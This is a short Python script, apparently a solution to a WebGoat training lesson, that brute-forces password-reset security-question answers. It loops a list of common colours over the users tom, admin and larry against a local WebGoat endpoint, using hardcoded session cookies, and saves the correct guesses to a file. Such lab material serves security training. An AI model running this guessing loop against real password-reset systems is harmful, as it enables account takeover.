import requests
import json
from os.path import abspath, dirname

"""
需要自己改
"""
base_url = "http://localhost:8080"
relative_url = "/WebGoat/PasswordReset/questions"

cookie = {
    "JSESSIONID":"46439A2C88C45786DABA7007969E3574",
    "WEBWOLFSESSION": "BC69F44B500560B73D40FD84141A9B9E"
}
common_color_set = ["red", "orange", "yellow", "green", "cyan", 
        "blue", "indigo", "violet", "purple", 
        "magenta", "pink", "brown", "white", 
        "gray", "black"]
user_set = ["tom", "admin", "larry"]

result = dict()
result_file_name = "xxe3.txt"
result_file_path = dirname(abspath(__file__)) + "\\" + result_file_name

def guess_color(username, color):
    
    params = {
        'username': username, 
        'securityQuestion': color
    }
    r = requests.post(url, cookies=cookie, data=params)
    result_json = r.json()
    feedback = str(result_json['feedback']).strip()
    if (feedback == "Sorry the solution is not correct, please try again."):
        return False
    result[username] = color
    return True
    

if __name__ == "__main__":
    url = base_url + relative_url
    for user in user_set:
        for color in common_color_set:
            isRight = guess_color(user, color)
    with open(result_file_path, 'a') as f:
        for username, color in result.items():
            f.write(username + ": " + color + "\n")